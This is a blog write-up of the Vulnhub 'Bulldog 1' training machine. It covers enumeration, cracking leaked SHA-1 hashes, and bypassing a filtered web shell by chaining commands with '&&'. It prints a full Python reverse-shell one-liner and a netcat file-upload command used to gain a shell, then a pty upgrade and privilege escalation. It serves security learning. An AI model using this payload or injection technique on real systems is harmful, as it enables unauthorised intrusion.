---
layout: post
title: Vulnhub - Bulldog 1
---

#### The Machine

The author of the machine states that it's not a beginners, machine, but a beginner/intermediate. I have to say that I agree with him, of course. 

Throughout the penetration, you have the chance to do multiple things such as: breaking hashes, get a reverse shell, escalate privileges and reverse engineer a program. Pretty cool, but it took me some time to finally get it. I knew it was going to be that way, it actually took me several days until I finally understood what to do in each case. Some parts, like breaking hashes or obtaining a shell where not that difficult, but escalating privileges, well, it's definitely
complicated and I'm pretty sure that there's a lot more to learn.

All in all, it was a great experience and I really learned a lot. I feel that I know a lot more than when I started it, and it was totally worth it despite the amount of hours it took me, being a beginner.

**Goal:** Get root and see the congratulatory message.

#### The Process

First, I do an arp-scan to see the IP of the target in the local network.

![arp-scan](./assets/bulldog-1/1.png)

I'll do a simple ping scan, saving the results into a file.

![Ping scan nmap]({{site.baseurl}}/assets/bulldog-1/2.png)

The scan lists that the following ports are open:

- 23/tcp, open, telnet
- 80/tcp, open, http
- 8080/tcp, open, http-proxy

I want to know now which services each port is running, so I do:

![Which services]({{site.baseurl}}/assets/bulldog-1/3.png)

Also, a UDP scan.

![UDP scan]({{site.baseurl}}/assets/bulldog-1/4.png)

I decide to check TCP port 80, so I go to the browser and check the page:

![Check TCP 80]({{site.baseurl}}/assets/bulldog-1/5.png)

The page seems normal. They explain that they are suspending operations because they suffered a data breach. I'll check the Public Notice:

![Public notice]({{site.baseurl}}/assets/bulldog-1/6.png)

The source code of the web doesn't tell me anything. So, I decided to run Nikto, and this is the result: 

![Nikto]({{site.baseurl}}/assets/bulldog-1/7.png)

A /dev directory. Interesting, let's see:

![Dev directory]({{site.baseurl}}/assets/bulldog-1/8.png)

Apparently, this is a "hidden" directory where only contractors should have access. They guy's name is Alan Brooke, he's the Team Lead and he explains that they are in the process of changing the entire staff. Little he does know that I are also a "new guy in the office"... He also says that they are still transitioning from the old system and that "we are using some files which may be corrutped from the original system". Oh yes, another thing: they will "prevent" future breaches by
writing their own software. 

![Hidden directory]({{site.baseurl}}/assets/bulldog-1/9.png)

Lastly he says that they are writing the system using Django, ssh is enabled for now, they are using a Web shell (with link), they started using MongoDB and a very useful list of users, from the Team Lead, to Back-up Team Lead, Frontend and Backend developers, and Database admin. Pure gold.

Well... More gold if I check the website source:

![More gold]({{site.baseurl}}/assets/bulldog-1/10.png)

Password hashes. I'll work on this in a bit.

Now I brute force port 80 searching for other interesting directories using dirb. 

![Brute force 80]({{site.baseurl}}/assets/bulldog-1/11.png)

Dirb found:

- /admin
- /admin/auth
- /admin/login
- /admin/auth/group
- /admin/auth/user
- /admin/logout
- /dev/shell

I check /admin:

![Check /admin]({{site.baseurl}}/assets/bulldog-1/12.png)

Ok, it redirects to /admin/login and it's a Django admin page. I wonder if one of the users I found can login here... 

I extract the data from the html and create a document called 'hashes.txt' that contain only the hashes for each user. How do I do that? I can simply copy those hashes into a file, but I prefer to exercise my bash skills. I do a wget and obtain the page 10.0.2.8/dev. Then, pipe a grep command giving me the lines of the hashes. And finally, use the cut command to extract the spaces 3 and 4 using the delimiter "-". Piece of cake.

![Piece of cake]({{site.baseurl}}/assets/bulldog-1/13.png)

After that, I get a list of common passwords in /usr/share/wordlists of my Kali Linux distribution and I unzip it on my directory. This list of passwords is called rockyou.txt.zip and it contains 14344392 passwords.

![List of passwords]({{site.baseurl}}/assets/bulldog-1/14.png)

I'll use hashcat to crack the passwords, but I need to identify the hash first. I use 'hash-identifier' to know which option to use in hashcat.

![Hash identifier]({{site.baseurl}}/assets/bulldog-1/15.png)

I have to use SHA-1 in hashcat, which is number 100. So the command is this:

![SHA-1 check]({{site.baseurl}}/assets/bulldog-1/16.png)
![SHA-2 check 2]({{site.baseurl}}/assets/bulldog-1/16-a.png)

Here's how it works:

- The option -m 100, specifies SHA-1.
- The option -a 0 specifies the attack mode, in this case using a wordlist (rockyou.txt)
- The option -o found.txt is to save the output in a file called like that.
- The --remove option will remove the hashes found from the file hashes.txt.

As you can see I'm doing this in an Intel Core i5-2520M CPU.

After a couple of seconds, the list of passwords is exhausted. However, it seems that 2 out of 7 passwords were recovered.

![2 out of 7 passwords]({{site.baseurl}}/assets/bulldog-1/17.png)

Great. Now, I compare:

- For the user nick@bulldogindustries.com, Back End developer the password is: bulldog.
- For the user sarah@bulldogindustries.com, Database admin, the password is: bulldoglover.

Fantastic.

I'll try now. I go to IP/admin and type nick:bulldog and see this:

![Log in using nick]({{site.baseurl}}/assets/bulldog-1/18.png)

Well, seems that I can't do anything. I'm in but, nothing to see here! What about sarah:bulldoglover?

![Log in using sarah]({{site.baseurl}}/assets/bulldog-1/19.png)

Nothing... Hold on a sec. In the /dev directory there's a shell that I can't access if I'm not logged in. What If I log in and I access the page?

![Access web shell]({{site.baseurl}}/assets/bulldog-1/20.png)

Yes! I am now in the world's most secure webshell.

Apparently, I can run only run a few controlled commands, like 'ls' for instance.

![Ls command]({{site.baseurl}}/assets/bulldog-1/21.png)

What if I inject some commands?

![Command injection]({{site.baseurl}}/assets/bulldog-1/22.png)

Nope. I was "caught". What about the command cd?

![Caught]({{site.baseurl}}/assets/bulldog-1/23.png)

Nope. Also, "caught".

Some commands work well, but the cat command sometimes gives me a 500 server error.

![500 error]({{site.baseurl}}/assets/bulldog-1/24.png)

I know that it is running ssh on port 23. Let's try to log in with the users we just got... Nope. Neither using "nick" or "sarah" will give me access. The good thing though, is that I have access to the command "cat" in the webshell. Maybe I can check the list of users using "cat /etc/passwd":

![Check users list]({{site.baseurl}}/assets/bulldog-1/25.png)

Ok. Now I know that there are two important users: bulldogadmin and django. None of those, however, accept bulldog or bulldoglover as the password when logging via ssh.

After trying to take advantage of this shell, I realize that if I use two commands in the same line... it doesn't complain! for instance:

![Duplicate commands]({{site.baseurl}}/assets/bulldog-1/26.png)

Here, I used a command that I wasn't suppose to run...It'll be great if I can give myself access to a shell, and connect from my attacking machine. I'll explore this a bit further. 

After trying to get a shell directly with Netcat, the server crashes. I can't get a reverse shell directly, but I can upload a file to the server and execute some script that will eventually give me a shell.

I create on my local computer a file called file.py that contains the following code:

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.2.11",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

Then, I go to the Web Shell and type:

`ls && nc -lvp 2134 > file.py`

This will create a listening connection on port 2134 and save anything on a file called file.py.

Finally, I connect to the machine on that port and send the content of the file.

![Connect to port]({{site.baseurl}}/assets/bulldog-1/27.png)

Now, on the target machine I see the file:

![See file]({{site.baseurl}}/assets/bulldog-1/28.png)

I only have to execute it, but first, open a connection on port 1234 (just as I specified on the script) on my local machine:

![Open connection on port 1234]({{site.baseurl}}/assets/bulldog-1/29.png)

And finally run the command on the web shell `ls && python file.py`.

![Run command on web shell]({{site.baseurl}}/assets/bulldog-1/30.png)

It worked.

I immediately go to the bulldogadmin directory and check what's there.

![Bulldogadmin dir]({{site.baseurl}}/assets/bulldog-1/31.png)

Interesting. I'll check first .hiddenadmindirectory:

![Check hiddenadmindirectory]({{site.baseurl}}/assets/bulldog-1/32.png)

This is all I wanted to hear (or read!). Currently, I am the webserver "django" which means that I just need to find the password and I'm sure I will find it in this file. I bet I can reverse it. At least try...

First, I would like to get a tty shell, and luckily I can do that with python. I'll run python -c 'import pty; pty.spawn("/bin/sh")' to get one.

After that I'll start reversing the file. First, I want to try the strings command to check the readable strings in the program:

![Reverse file]({{site.baseurl}}/assets/bulldog-1/33.png)

Well, I don't know if I'm lucky or what... But immediately after I start reading the strings, I realize there are four words I completely understand.

![Password hidden in strings]({{site.baseurl}}/assets/bulldog-1/34.png)

I know from the note that the webserver (django) has root access "sometimes". And given the strings I found, I bet that is the password for the webserver. Needed, of course, to perform tasks as root. This is the dumbest program I've seen, Ashley...

Well, I don't lose anything trying, right? I'll try to perform a task as sudo with the password: SUPERultimatePASSWORDyouCANTget.

![Sudo task]({{site.baseurl}}/assets/bulldog-1/35.png)

Great. I know have the password for the webserver... that can get root. It was just a matter of time...

![We can get root]({{site.baseurl}}/assets/bulldog-1/36.png)

And of course, after going to /root directory we get:

![Pwnage]({{site.baseurl}}/assets/bulldog-1/37.png)

Machine pwned.

